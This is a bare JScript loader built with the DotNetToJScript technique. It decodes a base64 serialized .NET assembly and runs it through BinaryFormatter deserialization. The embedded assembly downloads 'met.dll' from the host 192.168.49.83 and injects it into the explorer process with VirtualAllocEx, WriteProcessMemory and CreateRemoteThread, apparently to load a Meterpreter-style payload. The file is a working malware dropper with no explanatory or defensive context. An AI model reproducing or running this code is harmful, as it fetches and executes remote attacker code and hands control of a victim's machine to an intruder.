function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABYAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAvUTWXwAAAAAA"+
"AAAA8AAiIAsCMAAADgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoKwAA"+
"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAYAwAAAAgAAAADgAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAAQAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUABCEAACQKAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBwCkAAAAAQAAEQIoDgAA"+
"ChsoDwAACnIBAABwKBAAAAoKcxEAAApyEwAAcAZvEgAACnJNAABwKBMAAAoWmm8UAAAKCyD/Dx8A"+
"FgcoAQAABiV+FQAACiAAEAAAIAAwAAAfQCgCAAAGDCUIKBYAAAoGbxcAAAoGbxgAAAoSAygDAAAG"+
"JnJfAABwKAYAAAZyeQAAcCgFAAAGEwR+FQAAChYRBAgWfhUAAAooBAAABiYqIgMoGQAACiYqAAAA"+
"QlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAVAMAACN+AADAAwAAWAQAACNTdHJp"+
"bmdzAAAAABgIAACUAAAAI1VTAKwIAAAQAAAAI0dVSUQAAAC8CAAAaAEAACNCbG9iAAAAAAAAAAIA"+
"AAFHFQIUCQAAAAD6ATMAFgAAAQAAABYAAAACAAAACAAAABgAAAAZAAAADgAAAAEAAAACAAAABgAA"+
"AAEAAAACAAAAAABZAgEAAAAAAAYAegEEAwYA5wEEAwYAxwDSAg8AJAMAAAYA7wCLAgYAXQGLAgYA"+
"PgGLAgYAzgGLAgYAmgGLAgYAswGLAgYABgGLAgYA2wDlAgYAuQDlAgYAIQGLAgYA1ANtAgYABgRt"+
"AkMAogIAAAYAJwJtAgoA/APlAwoAjwPSAgYAywJtAgYAHgIYBAAAAAAKAAAAAAABAAEAAQAQAF8D"+
"AAA9AAEAAQAAAAAAgACRIIADXAABAAAAAACAAJEgJARjAAQAAAAAAIAAkSBDBGwACQAAAAAAgACR"+
"IDgAdwAOAAAAAACAAJEglwOCABUAAAAAAIAAliBLAIgAFwBIIAAAAACGGMUCBgAYAPggAAAAAIYA"+
"jAMQABgAAAABAGkDAAACAFsAAAADAC4AAAABAHcDAAACALQDAAADABcCAAAEAKgAAAAFANsDAAAB"+
"AHcDAAACAKYDAAADALACAAAEABECAgAFAHQCAAABAHcDAAACADMDAAADAAUCAAAEAL4DAAAFALkC"+
"AAAGAE8DAAAHACMAAAABAHcAAAACAH8AAAABAIgAAAABADwCCQDFAgEAEQDFAgYAGQDFAgoAKQDF"+
"AhAAMQDFAhAAOQDFAhAAQQDFAhAASQDFAhAAUQDFAhAAWQDFAhAAYQDFAhUAaQDFAhAAcQDFAhAA"+
"eQDFAgYAgQAuAiIAkQDNAygAmQDFAgYAmQBqAC4AoQCVADQAoQAcADsAqQCdAj8AsQDwA0IAsQBG"+
"A0cAkQBBAjsAoQASBE0ALgALAI0ALgATAJYALgAbALUALgAjAL4ALgArANMALgAzAP0ALgA7AP0A"+
"LgBDAL4ALgBLAAMBLgBTAP0ALgBbAP0ALgBjACgBLgBrAFIBQwBbAF8BGgBMAgEAQQEDAIADAQBB"+
"AQUAJAQBAAABBwBDBAEAAAEJADgAAQBDAQsAlwMCAAYBDQBLAAEABIAAAAEAAAAAAAAAAAAAAAAA"+
"MwQAAAIAAAAAAAAAAAAAAFMAEwAAAAAAAgAAAAAAAAAAAAAAUwBtAgAAAAAAAAAAAGtlcm5lbDMy"+
"ADxNb2R1bGU+AG1zY29ybGliAGdldF9JZABscFRocmVhZElkAHByb2Nlc3NJZABDcmVhdGVSZW1v"+
"dGVUaHJlYWQAR2V0TW9kdWxlSGFuZGxlAGJJbmhlcml0SGFuZGxlAERvd25sb2FkRmlsZQBoTW9k"+
"dWxlAHByb2NOYW1lAGxwTW9kdWxlTmFtZQBHZXRQcm9jZXNzZXNCeU5hbWUAZmxBbGxvY2F0aW9u"+
"VHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0"+
"ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2Vt"+
"Ymx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFz"+
"c2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0"+
"ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNz"+
"ZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAGR3U3Rh"+
"Y2tTaXplAG5TaXplAGR3U2l6ZQBFbmNvZGluZwBTdHJpbmcAR2V0Rm9sZGVyUGF0aABwYXRoAGdl"+
"dF9MZW5ndGgAa2VybmVsMzIuZGxsAEV4YW1wbGVBc3NlbWJseS5kbGwAU3lzdGVtAGxwTnVtYmVy"+
"T2ZCeXRlc1dyaXR0ZW4AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBTcGVjaWFsRm9sZGVyAGxwQnVm"+
"ZmVyAGxwUGFyYW1ldGVyAC5jdG9yAEludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1"+
"bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVi"+
"dWdnaW5nTW9kZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAEdldEJ5dGVzAGR3Q3JlYXRpb25GbGFncwBU"+
"ZXN0Q2xhc3MAcHJvY2Vzc0FjY2VzcwBoUHJvY2VzcwBPcGVuUHJvY2VzcwBSdW5Qcm9jZXNzAEdl"+
"dFByb2NBZGRyZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRBZGRyZXNzAENvbmNh"+
"dABPYmplY3QAZmxQcm90ZWN0AFN5c3RlbS5OZXQAZ2V0X0RlZmF1bHQAV2ViQ2xpZW50AEVudmly"+
"b25tZW50AFN0YXJ0AFN5c3RlbS5UZXh0AFZpcnR1YWxBbGxvY0V4AEV4YW1wbGVBc3NlbWJseQBX"+
"cml0ZVByb2Nlc3NNZW1vcnkAAAAAEVwAbQBlAHQALgBkAGwAbAAAOWgAdAB0AHAAOgAvAC8AMQA5"+
"ADIALgAxADYAOAAuADQAOQAuADgAMwAvAG0AZQB0AC4AZABsAGwAABFlAHgAcABsAG8AcgBlAHIA"+
"ABlrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAAGUwAbwBhAGQATABpAGIAcgBhAHIAeQBBAAAAAY9m"+
"yxMaUEik8RdMT7qc1wAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBwcFDggYGBgFAAEOEUUFAAIO"+
"Dg4FIAIBDg4GAAEdElEOAyAACAIGGAQAABJZBSABHQUOBQABElEOCLd6XFYZNOCJBgADGAkCCAgA"+
"BRgYGAkJCQoABQIYGB0FCBAYCgAHGBgYCRgYCRgFAAIYGA4EAAEYDggBAAgAAAAAAB4BAAEAVAIW"+
"V3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAUAQAPRXhhbXBsZUFzc2VtYmx5AAApAQAk"+
"RXhhbXBsZSBBc3NlbWJseSBmb3IgRG90TmV0VG9KU2NyaXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0"+
"IMKpIEphbWVzIEZvcnNoYXcgMjAxNwAAKQEAJDU2NTk4ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3"+
"YWJlNTc3NwAADAEABzEuMC4wLjAAAAUBAAEAAAAAAAAAAAC9RNZfAAAAAAIAAAAcAQAARCsAAEQN"+
"AABSU0RTHmS85qzQikOHJ0GQDokIyQEAAABcXDE5Mi4xNjguNDkuODNcdmlzdWFsc3R1ZGlvXERv"+
"dE5ldFRvSlNjcmlwdC1kbGxpbmplY3RcRXhhbXBsZUFzc2VtYmx5XG9ialx4NjRcUmVsZWFzZVxF"+
"eGFtcGxlQXNzZW1ibHkucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAAB"+
"AAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAALADAAAAAAAAAAAAALADNAAAAFYA"+
"UwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/"+
"AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAA"+
"AAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQQAwAAAQBTAHQAcgBpAG4AZwBG"+
"AGkAbABlAEkAbgBmAG8AAADsAgAAAQAwADAAMAAwADAANABiADAAAABiACUAAQBDAG8AbQBtAGUA"+
"bgB0AHMAAABFAHgAYQBtAHAAbABlACAAQQBzAHMAZQBtAGIAbAB5ACAAZgBvAHIAIABEAG8AdABO"+
"AGUAdABUAG8ASgBTAGMAcgBpAHAAdAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAA"+
"AAAAAAAASAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEUAeABhAG0AcABs"+
"AGUAQQBzAHMAZQBtAGIAbAB5AAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4A"+
"MAAuADAALgAwAAAASAAUAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABFAHgAYQBtAHAAbABl"+
"AEEAcwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAYgAfAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcA"+
"aAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAASgBhAG0AZQBzACAARgBvAHIAcwBoAGEAdwAg"+
"ADIAMAAxADcAAAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAA"+
"UAAUAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBz"+
"AHMAZQBtAGIAbAB5AC4AZABsAGwAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEUA"+
"eABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBz"+
"AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMA"+
"aQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxl"+
"Y3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}